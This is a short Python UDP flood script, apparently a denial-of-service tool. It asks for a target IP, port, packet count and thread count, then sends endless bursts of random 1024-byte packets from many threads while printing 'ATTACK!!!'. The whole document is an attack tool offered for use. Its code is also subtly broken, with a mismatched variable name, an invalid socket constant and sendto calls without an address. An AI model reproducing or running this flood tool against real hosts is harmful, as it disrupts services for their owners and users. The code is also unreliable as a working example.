simpledosudp
#codebyxalbador
import socket
import random
import threading
import os,sys

print("Adil")

ip_adip = str(input("Ip Target : "))
port_adil = int(input("Port Target : "))
paket_adil = int(input("Paket Dari adil : "))
threads_adil = int(input("Thread Dari adil : "))
os.system("clear")

def adil():
    asu = random._urandom(1024)#ubah angka urandom= damage
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_adil,port_adil))
            s.sendto(asu)
            for x in range(paket_adil):
                s.sendto(asu)
            print("[•] adil ATTACK!!!")
        except:
            print("[•] adil ATTACK!!!")

for y in range(threads_adil):
    th = threading.Thread(target=adil)
    th.start()